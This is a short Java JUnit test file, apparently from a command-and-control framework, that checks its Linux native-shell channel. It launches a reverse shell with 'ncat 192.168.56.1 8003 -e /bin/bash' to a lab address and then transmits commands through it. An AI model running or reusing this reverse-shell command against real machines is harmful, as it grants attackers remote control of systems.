package c2.nativeshell;


import org.junit.jupiter.api.Test;

import c2.remote.RemoteTestExecutor;
import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;

public class RunnerTestNativeLinuxDaemon extends ClientServerTest{

	@Test
	void testLocal() {
		test();
	}
	
	public static void test() {
		initiateServer();
		
		RemoteTestExecutor exec = new RemoteTestExecutor();
		exec.startTestProgram(1005, "ncat 192.168.56.1 8003 -e /bin/bash");
		
		System.out.println("Transmitting commands");
		
		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
		RunnerTestGeneric.test(config);
		teardown();
	}

}
